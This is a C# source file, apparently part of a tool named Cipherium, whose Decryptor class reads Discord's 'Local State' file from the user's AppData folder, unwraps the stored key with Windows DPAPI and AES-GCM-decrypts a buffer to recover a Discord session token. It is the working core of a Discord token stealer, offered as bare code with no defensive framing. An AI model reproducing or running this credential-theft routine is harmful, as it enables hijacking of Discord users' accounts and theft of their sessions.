using Newtonsoft.Json;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Cipherium.Core.Decryption
{
    internal class Decryptor
    {

        public static byte[] DecryptData(string path)
        {
            dynamic deserializedFile = JsonConvert.DeserializeObject(File.ReadAllText(path));
            string encryptedKey = (string)deserializedFile.os_crypt.encrypted_key;
            byte[] base64DecodedKey = Convert.FromBase64String(encryptedKey);
            byte[] unprotectedData = ProtectedData.Unprotect(base64DecodedKey.Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);

            return unprotectedData;
        }


        public static string DecryptToken(byte[] buffer)
        {
            byte[] encryptedData = buffer.Skip(15).ToArray();
            byte[] key = DecryptData(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"discord\Local State"));
            byte[] nonce = buffer.Skip(3).Take(12).ToArray();

            AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, nonce, null);
            GcmBlockCipher blockCipher = new GcmBlockCipher(new AesEngine());
            blockCipher.Init(false, parameters);

            byte[] decryptedBytes = new byte[blockCipher.GetOutputSize(encryptedData.Length)];
            blockCipher.DoFinal(decryptedBytes, blockCipher.ProcessBytes(encryptedData, 0, encryptedData.Length, decryptedBytes, 0));

            return Encoding.UTF8.GetString(decryptedBytes).TrimEnd('\r', '\n', '\0');
        }

    }
}
